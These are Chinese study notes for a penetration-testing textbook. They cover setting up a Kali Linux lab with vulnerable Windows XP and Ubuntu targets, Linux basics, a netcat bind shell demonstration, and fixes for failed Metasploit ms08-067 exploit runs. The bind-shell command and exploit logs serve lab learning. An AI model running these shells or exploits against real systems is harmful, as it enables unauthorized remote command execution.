#### 第一章 搭建环境
##### 安装VMware
[安装VMware Player](https://my.vmware.com/cn/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/15_0)

##### 安装和配置kali Linux和靶机
1. [下载Kali Linux镜像](https://nostarch.com/pentesting)  
上面的链接是原书使用的Kali版本，但我认为最好是安装最新版的Kali Linux。
2. 原书的登陆`username`: `root` `password`: `toor`。
3. VMware网络配置桥接（bridged）模式
4. [安装Nessus](https://www.tenable.com/downloads/nessus)
5. 安装Ming C编译器
6. 安装Hyperion（hyperion2.0-0已经加到kali2中，无需再次安装）
7. 安装Veil-Evasion(Veil-Evasion已不被作者支持，可以安装Veil3:https://github.com/Veil-Framework/Veil)
8. 配置Ettercap
9. 创建靶机

- Ubuntu 8.10  
- Windows XP SP3  
下载文件：ed2k://|file|zh-hans_windows_xp_service_pack_3_x86_cd_x14-60563.iso|417675264|2AAB7F0CD4BE378D9113557B1D24D8D0|/  
- Windows 7 SP1  
下载文件：ed2k://|file|cn_windows_7_professional_with_sp1_vl_build_x64_dvd_u_677816.iso|3266004992|5A52F4CCEFA71797D58389B397038B2F|/  

10. 配置靶机环境

##### Q&A
1. Nessus6.5.4安装及Plugins Download Fail  
解决办法：  
https://blog.csdn.net/ling_xiao007/article/details/50670441
2. Kali安装Mingw32：`E.无法定位安装包mingw32`  
解决办法：  
运行命令：`gedit /etc/apt/sources.list`  
添加两行内容：
```
deb http://old.kali.org/kali sana main non-free contrib
deb-src http://old.kali.org/kali sana main non-free contrib
```
运行命令：`apt-get update`  
安装mingw32:`apt-get install mingw32`

#### 第二章 使用Kali Linux
1. 管道命令`>`会把目标文件中的原始内容彻底覆盖；管道命令`>>`用于向已有文件追加文本内容。
2. 用`chmod`命令可以改变文件访问权限

| 整数值 |  权  限  |
|--------|----------|
|      7 | 全部权限 |
|      6 | 读、写   |
|      5 | 读、执行 |
|      4 | 只读     |
|      3 | 写、执行 |
|      2 | 只写     |
|      1 | 只执行   |
|      0 | 拒绝访问 |

3. `grep`是在文件中搜索文本的命令：`grep keyword filename`。
4. `sed`替换文件中的关键字：`sed 's/Blackhat/Defcon' filename`，Blackhat替换为Defcon。
5. 开放式shell和反弹式shell
    5.1 开放式shell
实验环境：

受害者：

Ubuntu Linux --------> 192.168.01.106

攻击者：

Kali Linux ----------> 192.168.0.104

我们就以最常见的bash为例：

Ubuntu Linux上执行：  
`root@ubuntu:~# nc -lvp 1234 -e /bin/bash`

Kali Linux上执行：  
```bash
root@Kali:~# nc 192.168.01.106 1234
whoami
# 输出
root
ls
# 输出
公共
模板
视频
图片
文档
下载
音乐
桌面
```
开放式Shell也就是受害主机监听某一端口并绑定主机的Shell，攻击主机通过Netcat连接到受害主机的端口可以在受害主机执行任意Linux命令，并回显在攻击主机上。
    5.2 反弹式shell
与开放式shell相反，详见[链接](https://xz.aliyun.com/t/2549)

6. 在/etc/crontab文件中可以设置定时任务

##### Q&A
1. 设置静态路由之后，运行`service network restart`命令，出现错误：
```
[FAILED] Failed to start Raise network interfaces.
 See 'systemctl status networking.service' for details
```
解决办法：  
在`/etc/udev/rules.d/`新建一个文件`10-rename-network.rules`，添加下面的内容：  
`SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="ff:ff:ff:ff:ff:ff", NAME="eth0"`，再重启系统即可。

#### 第三章 编程
略

#### 第四章 使用Metasploit框架

##### Q&A
1. exploit ms08-067时出现错误：
```shell
[*] Started reverse TCP handler on 192.168.0.105:4444 
[-] 192.168.0.109:445 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (192.168.0.109:445).
[*] Exploit completed, but no session was created.
```
解决办法：首先检查在Kali Linux是否能Ping通Windows XP；再在Kali Linux上检查Windows XP是否是否已经启用445端口：`nmap -p 445 192.168.0.XXX`。如果检查成功，那么重启Window XP，开机后在Kali Linux上exploit。

2. exploit ms08-067时出现错误：
```shell
*] Started reverse TCP handler on 192.168.0.105:4444 
[*] 192.168.0.109:445 - Automatically detecting the target...
[*] 192.168.0.109:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 192.168.0.109:445 - We could not detect the language pack, defaulting to English
[*] 192.168.0.109:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.0.109:445 - Attempting to trigger the vulnerability...
[*] Exploit completed, but no session was created.
```
解决办法：根据提示，很明显是metasploit无法识别目标主机的版本，那么我们就先查看这个漏洞可以用在哪些系统：`show targets`，再根据时间情况选择对应target序号：`set target XX`。

